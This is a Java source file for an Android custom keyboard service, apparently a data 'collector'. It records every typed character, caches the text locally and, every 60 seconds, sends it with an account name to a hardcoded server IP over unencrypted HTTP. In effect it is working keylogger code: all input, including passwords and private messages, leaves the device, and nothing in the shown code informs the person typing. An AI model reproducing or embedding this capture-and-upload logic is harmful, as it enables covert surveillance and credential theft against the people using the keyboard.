package hr.fer.collectors;

import android.app.Service;
import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.KeyboardView;
import android.os.Handler;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import hr.fer.R;
import hr.fer.connection.PostDataToServer;

public class KeyboardCollectorService extends  InputMethodService
        implements KeyboardView.OnKeyboardActionListener {
    public static final long NOTIFY_INTERVAL = 60 * 1000; // 60 seconds
    private final String PATH = "./cache.txt";
    private final String SERVER_PATH = "http://161.53.64.201:8080/collector/keyboard/store";
    private File cache;

    private KeyboardView kv;
    private android.inputmethodservice.Keyboard keyboard;

    private Date datetime = new Date();
    private boolean caps = false;

    private StringBuilder typedText;
    private String account;

    private Handler handler = new Handler();
    private Timer timer = null;

    @Override
    public View onCreateInputView() {
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new android.inputmethodservice.Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        return kv;
    }

    @Override
    public int onStartCommand (Intent intent, int flags, int startId) {
        account = (String) intent.getExtras().get("Account");
        return Service.START_NOT_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        File path = getApplicationContext().getFilesDir();
        cache = new File(path, PATH);

        try {
            cache.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
        }

        typedText = new StringBuilder();

        if (timer != null) {
            timer.cancel();
        } else {
            timer = new Timer();
        }
        // schedule task
        timer.scheduleAtFixedRate(new CacheTimer(), 0, NOTIFY_INTERVAL);
    }


    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection ic = getCurrentInputConnection();

        switch (primaryCode) {
            case android.inputmethodservice.Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1, 0);
                if(typedText.length() == 0) break;
                typedText.setLength(typedText.length() - 1);
                break;
            case android.inputmethodservice.Keyboard.KEYCODE_SHIFT:
                caps = !caps;
                keyboard.setShifted(caps);
                kv.invalidateAllKeys();
                break;
            case android.inputmethodservice.Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                typedText.append("\n");
                break;
            default:
                char code = (char) primaryCode;
                if (Character.isLetter(code) && caps) {
                    code = Character.toUpperCase(code);
                }

                ic.commitText(String.valueOf(code), 1);

                typedText.append(code);
                if (typedText.length() == 100) {
                    try {
                        writeToCache(typedText.toString());
                    } catch (IOException e) {
                        e.printStackTrace();

                    }
                    typedText.setLength(0);
                }
        }


        }



    @Override
    public void onPress(int primaryCode) {
    }

    @Override
    public void onRelease(int primaryCode) {
    }

    @Override
    public void onText(CharSequence text) {

    }

    @Override
    public void swipeDown() {
    }

    @Override
    public void swipeLeft() {
    }

    @Override
    public void swipeRight() {
    }

    @Override
    public void swipeUp() {
    }

    public void writeToCache(String text) throws IOException {
        BufferedWriter stream = new BufferedWriter(new FileWriter(cache, true));
        stream.write(text);
        stream.close();
    }

    private String readFromCache() throws IOException {
        int length = (int) cache.length();
        byte[] bytes = new byte[length];

        FileInputStream in = new FileInputStream(cache);
        in.read(bytes);
        String contents = new String(bytes);

        cache.delete();
        cache.createNewFile();

        return contents;
    }

    private HashMap<String, String> preparePOSTParams(){
        String contents = "";
        try {
            contents = readFromCache();
        } catch (IOException e) {
            e.printStackTrace();
        }

        if(contents.length() == 0) return new HashMap<>();

        HashMap<String, String> postDataParams = new HashMap<>();
        postDataParams.put("account", account);
        postDataParams.put("text", contents);
        postDataParams.put("date", datetime.toString());
        return postDataParams;
    }

    private class CacheTimer extends TimerTask{

        @Override
        public void run() {
            //did I type something new?
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Log.d("CacheTimer", "Sending to server...");
                    //send cached text to server
                    HashMap<String, String> params = preparePOSTParams();
                    if(params == null || params.isEmpty()) return;

                    new PostDataToServer(SERVER_PATH, params).execute();
                }

            });
        }
    }



}
